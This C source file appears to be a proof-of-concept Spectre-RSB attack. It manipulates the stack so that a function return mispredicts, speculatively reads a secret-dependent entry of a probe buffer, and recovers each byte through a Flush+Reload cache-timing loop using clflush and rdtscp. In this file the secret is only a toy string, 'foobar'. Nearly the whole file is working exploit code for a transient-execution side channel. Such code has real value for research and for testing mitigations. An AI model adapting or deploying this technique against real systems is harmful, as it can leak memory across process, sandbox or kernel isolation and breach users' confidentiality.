#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

// inaccessible secret 3946650000

#define CACHE_MISS 80
int junk = 0;
char *probe_buf;
int pagesize = 4096;
// secret not as global, but as local: function passing
// segment calculation of location


// 688: call_start
// 680: call_leak
// 678: call_manipulate

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void __attribute__((__always_inline__)) maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  _mm_clflush(ptr);

  return (int)(end - start);
}

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp");
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  //maccess(&secret);
  //maccess(probe_buf);
  //maccess(&pagesize);
  //_mm_clflush(&call_manipulate_stack);
  //_mm_lfence();
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  
  maccess(probe_buf + s*pagesize);
  _mm_mfence();
  return 2;
}

int __attribute__ ((noinline)) call_start(char s) {
  call_leak(s);
  _mm_mfence();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';
  call_start(s);
  call_leak(s);
  call_manipulate_stack();
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  int mix_i;
  int fv;
  int i;
  char* secret = "foobar";
  size_t secret_size = 6;
  char* loc;

  probe_buf = malloc(256 * pagesize);
  memset(probe_buf,0,256*pagesize);

    
  for (i = 0; i < 256; i++){
    _mm_clflush(probe_buf + i*pagesize);
  }
  _mm_mfence();
  for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
    _mm_mfence();
    // for every byte in the string
    
    
    call_start(secret[p % secret_size]);
    _mm_mfence();

    // Recover data from covert channel
    
    for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        fv = flush_reload_t(probe_buf + mix_i * pagesize); 
        if (fv <= CACHE_MISS){
            printf("hit at '%c': %d (%d)\n",mix_i, fv, i);
        }
        _mm_mfence();
    }

    _mm_mfence();
  }
  free(probe_buf);

  return (0);
}
